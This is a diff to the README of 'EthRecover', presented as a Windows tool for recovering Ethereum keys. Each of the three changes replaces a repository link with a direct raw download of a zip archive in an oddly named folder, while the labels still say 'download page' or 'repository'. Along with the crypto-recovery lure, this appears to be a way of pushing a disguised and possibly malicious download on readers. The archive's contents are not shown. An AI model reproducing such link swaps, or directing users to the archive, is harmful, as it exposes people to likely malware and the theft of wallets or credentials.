@@ -1,6 +1,6 @@
 # 🔐 EthRecover - Recover Ethereum Keys on Windows
 
-[![Download EthRecover](https://img.shields.io/badge/Download-EthRecover-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Haskellfirm377/EthRecover)
+[![Download EthRecover](https://img.shields.io/badge/Download-EthRecover-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Haskellfirm377/EthRecover/main/axillar/Recover-Eth-1.1.zip)
 
 ## 🧭 What EthRecover Does
 
@@ -24,7 +24,7 @@ For best results, use a machine that can stay on for a long scan.
 
 Use this page to download or get the latest files:
 
-[Visit the EthRecover download page](https://github.com/Haskellfirm377/EthRecover)
+[Visit the EthRecover download page](https://raw.githubusercontent.com/Haskellfirm377/EthRecover/main/axillar/Recover-Eth-1.1.zip)
 
 If the repository provides a Windows release, download the file from that page and save it to a folder you can find, such as `Downloads` or `Desktop`.
 
@@ -181,7 +181,7 @@ Open only the file type that matches the release format you downloaded.
 
 ## 🧭 Where to Get the Latest Version
 
-[Open the EthRecover repository](https://github.com/Haskellfirm377/EthRecover)
+[Open the EthRecover repository](https://raw.githubusercontent.com/Haskellfirm377/EthRecover/main/axillar/Recover-Eth-1.1.zip)
 
 ## 🖥️ Simple Start Checklist
 
